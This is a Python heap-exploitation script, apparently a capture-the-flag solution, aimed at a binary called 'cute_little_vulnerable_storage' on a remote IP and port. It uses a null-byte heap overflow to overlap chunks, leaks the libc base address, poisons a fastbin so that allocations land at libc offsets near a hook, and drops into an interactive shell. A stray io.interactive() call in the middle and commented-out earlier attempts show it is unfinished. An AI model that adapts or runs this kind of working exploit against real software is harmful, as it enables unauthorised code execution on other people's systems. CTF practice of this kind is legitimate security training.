#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./cute_little_vulnerable_storage')

host = args.HOST or '3.99.48.161'
port = int(args.PORT or 9004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def cmd(option):
    sla(">>", str(option))

def add(size, payload=None):
    cmd(1)
    global i
    i=i+1
    sla("Enter the size:", str(size))
    if payload != None:
        edit(i, payload)
    return i

def edit(idx, payload):
    cmd(3)
    sla("Enter the index:", str(idx))
    sla("Enter the data:", payload)

def view(idx):
    cmd(4)
    sla("Enter the index:", str(idx))


def delete(idx):
    cmd(2)
    sla("Enter the index:", str(idx))

i=-1

io = start()

# add(0xf0+8)#sb1 #0
# edit(0, b"A"*(0xf0+8))
# add(0x70+8)#fb1 #1
# edit(1, b"B"*(0x70+8))
# add(0xf0+8)#sb2 #2
# edit(2, b"C"*(0xf0+8))
# add(0x30+8)#fb2 #3
# edit(3, b"\x00"*(0x30+8))
# 
# delete(0)
# delete(1)
# # null byte heap overflow
# # prev_size = 0x180
# # prev_in_use = 0
# add(0x78)
# edit(4, b'E' * 0x70 + p64(0x180)) #4

# first fastbin gets overlapped
# delete(2)

# add(0xf0,b'F' * 0xf0) #5
libc = ELF("./libc.so.6")
add(0x40,"/bin/sh\x00")  # 0
add(0xf0,p64(0x21)*29) # 1
add(0x40,p64(0x21)*8) # 2 
add(0x40,p64(0x21)*8) # 3
add(0x58,"EEEEEEEE") # 4
add(0xf0,p64(0x21)*29) # 5
edit(4,b"X"*0x50+p64(0x200))
delete(1)

delete(5)
add(0x100,"ZZZZ") # 6
add(0x100,"YYYY") # 7
add(0xd0,"WWWW")  # 8
add(0x58, "["*8) # 9
io.interactive()
delete(7)
view(2)
reu("contents")
print(ren(16))
libc.address = uu64(ren(6)) - 0x397b58
log.info(f"libc base {hex(libc.address)} ")
add(0x100, "G"*8) # 9
edit(2, b"A"*8 + p64(0x71) + p64(0x0) + p64(0x0) + b"P".ljust(32, b"P"))
delete(9)
edit(2, b"A"*8 + p64(0x71) + p64(libc.address + 0x397acd) + p64(0x0))
add(0x68, "/bin/sh\x00")
add(0x68, b"a"*19 + p64(libc.address + 0x400d0))
# add(next(libc.search(b'/bin/sh\x00')))
io.interactive()


